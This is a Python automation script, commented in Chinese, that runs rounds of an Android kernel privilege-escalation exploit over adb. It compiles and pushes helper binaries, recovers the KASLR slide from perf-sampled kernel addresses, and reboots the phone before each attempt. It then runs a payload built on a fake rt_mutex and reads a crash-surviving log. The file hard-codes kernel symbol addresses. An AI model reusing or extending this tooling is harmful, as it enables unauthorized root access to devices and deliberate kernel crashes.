# -*- coding: utf-8 -*-
"""auto.py — 一轮完整的"解 slide → 编译推送 → 跑 m1 → 等重启 → 读设备端日志"。

为什么必须每轮重算 slide: 每次开机 KASLR 都变; 而 m1 一炸就重启。
设备端 /data/local/tmp/m1.log 是 fsync 落盘的, panic 之后仍然读得到 ⇒ 它是唯一可信的
"死在哪一步"的证据(adb shell 的 stderr 在 panic 时会丢尾巴)。

用法: python cm56/auto_m1.py [benign|real]
"""
import io, os, re, subprocess, sys, time, collections
for _n in ('stdout', 'stderr'):
    try: getattr(sys, _n).reconfigure(encoding='utf-8', errors='replace')
    except Exception: pass

BASE = r'G:\项目\Windows管理\usb\临时root'
ADB = r'C:\adb\platform-tools\adb.exe'
DEV = '<DEVICE_SERIAL>'
CL = (r'J:\Users\Administrator\AppData\Local\Android\Sdk\ndk\27.3.13750724'
      r'\toolchains\llvm\prebuilt\windows-x86_64\bin\aarch64-linux-android35-clang.cmd')
HERE = os.path.dirname(os.path.abspath(BASE))
AN = os.path.join(BASE, 'analysis')
TEXT_LEN = 0x1520000
FRESH = True   # 每轮开头强制重启到新 boot(假 lock 的零洞一次 boot 只能用一次)
HOT_OK = ('kfree', 'kmem_cache', 'avc_lookup', 'vsnprintf', 'number', '__d_lookup',
          'selinux', 'memset', 'memcpy', 'link_path_walk', '__arm64_sys', 'mutex_lock',
          '_raw_spin_unlock', 'kernfs', 'proc_', 'strchr', 'd_alloc', 'rcu')


def sh(args, **kw):
    kw.setdefault('capture_output', True)
    kw.setdefault('text', True)
    kw.setdefault('encoding', 'utf-8')
    kw.setdefault('errors', 'replace')
    return subprocess.run(args, **kw)


ENTRY = (0xffffffc0100840c0, 0x1400)   # el0_sync … el0_svc … ret_to_user 整块入口区
GETPPID = 0xffffffc0102ff034           # __arm64_sys_getppid (0x44 字节)
SVC_COMMON = 0xffffffc0102c63b0        # el0_svc_common


def build_sp():
    r = sh([CL, '-O2', '-g0', '-fPIE', '-pie', '-Wall',
            os.path.join(BASE, 'cm57', 'sp.c'), '-o', os.path.join(BASE, 'cm57', 'spbin')])
    if r.returncode:
        print(r.stderr[-2000:])
        raise SystemExit('sp.c 编译失败')
    sh([ADB, '-s', DEV, 'push', os.path.join(BASE, 'cm57', 'spbin'), '/data/local/tmp/sp'])
    # ★ adb push 不保留可执行位(和 pr 一样要 chmod); 漏了它 sp 根本没跑,
    #   正对照就会"两个候选都 0 命中"(9/27 踩过)。
    sh([ADB, '-s', DEV, 'shell', 'chmod', '755', '/data/local/tmp/sp'])
    chk = sh([ADB, '-s', DEV, 'shell', '/data/local/tmp/sp', '173', '1'])
    if 'loops=' not in (chk.stdout or ''):
        raise SystemExit('sp 自检失败: rc=%s out=%r err=%r'
                         % (chk.returncode, (chk.stdout or '')[-200:], (chk.stderr or '')[-300:]))
    print('sp 自检 ok:', chk.stdout.strip(), flush=True)


def sample_pc(secs=25):
    """perfips 是**自采样**(它自己循环 syscall + 对自己开 perf 事件),
    所以样本天然只来自这条循环 ⇒ 背景噪声(整个 Android)一点都不进来。
    (用外部 sp 陪跑是没用的: 9/27 实测 10 个 sp 也会被后台淹没。)"""
    sh([ADB, '-s', DEV, 'shell', 'rm', '-f', '/data/local/tmp/ipk.txt'])
    sh([ADB, '-s', DEV, 'shell', '/data/local/tmp/perfips', str(secs),
        '>', '/data/local/tmp/ipk.txt'], timeout=secs + 180)
    sh([ADB, '-s', DEV, 'pull', '/data/local/tmp/ipk.txt', r'C:\qemu_test\ipk.txt'],
       timeout=120)
    ips = set()
    try:
        for l in io.open(r'C:\qemu_test\ipk.txt', encoding='utf-8', errors='replace'):
            m = re.search(r'([0-9a-f]{12,16})\s*$', l.strip())
            if m:
                v = int(m.group(1), 16)
                if v >= 0xffff000000000000:
                    ips.add(v)
    except IOError:
        pass
    return sorted(ips)


def solve_slide():
    """slide 一律由**正对照**求解(analysis/slide_pc.py): 采样器自循环 syscall,
    于是"必定经过 el0_svc_common/link_path_walk/__arm64_sys_*" 是构造性事实;
    这些窄窗口合计 ~3.6 KB, 放错 2MB 就一个都打不中(实测第二名 0 命中)。
    ★ 旧的"热点名字像不像"判据选错过的 slide 会让假 lock 落在未映射地址 ⇒ 第一发就炸,
      并且会把"几何/节拍对不对"这个真问题完全遮住(9/27 就烧了 6 轮才发现)。"""
    ips = sample_pc()
    if len(ips) < 50:
        raise SystemExit('正对照采样太少: %d' % len(ips))
    f = r'C:\qemu_test\ips_auto.txt'
    io.open(f, 'w', encoding='utf-8').write('\n'.join('%x' % a for a in ips) + '\n')
    r = sh([sys.executable, os.path.join(AN, 'slide_pc.py'), f], timeout=900)
    out = (r.stdout or '') + (r.stderr or '')
    print(out.strip()[-1200:], flush=True)
    m = re.search(r'^SLIDE ([0-9a-f]+)\s*$', out, re.M)
    if not m:
        raise SystemExit('正对照没给出 slide ⇒ 停(不猜)')
    s = int(m.group(1), 16)
    print('选定 slide=%x (正对照)' % s)
    return s


def build():
    r = sh([CL, '-O2', '-g0', '-fPIE', '-pie', '-pthread', '-Wall',
            '-Wno-unused-parameter', '-Wno-unused-function',
            os.path.join(BASE, 'cm57', 'pr.c'), '-o', os.path.join(BASE, 'cm57', 'prbin')])
    if r.returncode:
        print(r.stderr[-3000:])
        raise SystemExit('编译失败')


def fresh_boot(need_slide=True):
    """每轮开头强制重启: 一次 punch 会把当次开机里当假 rt_mutex 的那块零洞弄脏
    (rb_node/rb_leftmost 都填上了 S), 复用同一个 boot 会让链走下潜到脏树里 ⇒ 必炸。
    9/27 就因为"接着上一轮成功的 boot 再打一发"白烧了一轮。顺带 KASLR 也会重新随机。"""
    sh([ADB, '-s', DEV, 'reboot'], timeout=60)
    sh([ADB, 'wait-for-device'], timeout=900)
    for _ in range(40):
        r = sh([ADB, '-s', DEV, 'shell', 'getenforce'], timeout=30)
        if 'Enforcing' in (r.stdout or '') or 'Permissive' in (r.stdout or ''):
            break
        time.sleep(3)
    time.sleep(8)
    print('  已重启到新 boot', flush=True)


def main():
    mode = sys.argv[1] if len(sys.argv) > 1 else 'real'
    # 上一轮如果炸了, 设备还在重启; 先等回来再干活(否则 push/采样全失败被误判成"炸")
    sh([ADB, 'wait-for-device'], timeout=600)
    time.sleep(6)
    build()
    global FRESH
    if mode.startswith('nofresh'): FRESH = False
    if FRESH:
        fresh_boot()
    if mode.startswith('probe') or 'benign' in mode:
        # probe/benign 载荷不解引用任何核地址(prio 命中就 [3] 早退) ⇒ slide 无关,
        # ⇒ 用它做"几何+节拍对不对"的**与 slide 无关**的判别, 不会被算错的 slide 污染。
        slide = 0
        print('%s 模式: 跳过 perf 采样(slide 用不上)' % ('probe' if mode.startswith('probe') else 'benign'),
              flush=True)
    else:
        build_sp()
        slide = solve_slide()
    sh([ADB, '-s', DEV, 'shell', 'rm', '-f', '/data/local/tmp/pr.log'])
    sh([ADB, '-s', DEV, 'push', os.path.join(BASE, 'cm57', 'prbin'), '/data/local/tmp/pr'])
    # mode 里除了 slide 之外的参数原样传给程序, 例如:
    #   "probe 0 32"  /  "shape1 w17"  /  "benign"
    if mode.startswith('nofresh'):
        FRESH = False
        mode = mode[len('nofresh'):].strip()
    extra = '' if mode in ('real', '') else ' ' + mode
    cmd = 'chmod 755 /data/local/tmp/pr; /data/local/tmp/pr %x%s' % (slide, extra)
    print('RUN:', cmd)
    t0 = time.time()
    p = sh([ADB, '-s', DEV, 'shell', cmd], timeout=900)
    print('--- 运行 %.1fs rc=%s ---' % (time.time() - t0, p.returncode))
    print((p.stdout or '')[-1500:])
    print((p.stderr or '')[-1500:])
    print('--- 等设备回来, 读设备端 m1.log (panic 也留得住) ---')
    sh([ADB, 'wait-for-device'], timeout=600)
    time.sleep(8)
    log = sh([ADB, '-s', DEV, 'shell', 'cat', '/data/local/tmp/pr.log'])
    print(log.stdout)
    print('uptime/getenforce:', sh([ADB, '-s', DEV, 'shell',
                                   'cat /proc/uptime; getenforce']).stdout.strip())


main()
